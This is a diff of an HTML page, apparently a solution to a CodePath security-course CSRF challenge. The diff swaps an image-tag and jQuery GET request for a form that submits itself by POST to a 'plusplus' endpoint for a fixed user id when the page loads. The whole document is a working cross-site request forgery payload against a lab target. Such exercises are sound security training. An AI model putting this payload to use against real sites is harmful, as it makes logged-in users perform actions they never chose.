@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <img src="https://security.codepath.com/user/csrfchallengetwo/plusplus/userid=b7396468f567656faa397e29e0a1e135dccd6387"/>
-
-    <script type="text/javascript">
-        $(document).ready(function(){
-        $("#content").attr("src","https://security.codepath.com/user/csrfchallengetwo/plusplus/userid=b7396468f567656faa397e29e0a1e135dccd6387");
-    })
-    </script>
+    <form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus/userid=b7396468f567656faa397e29e0a1e135dccd6387" method="POST" target="not_shown">
+        <input type="submit" id="submitButton">
+      </form>
+      <script>
+        document.csrfForm.submit();
+      </script>
 </body>
 </html>
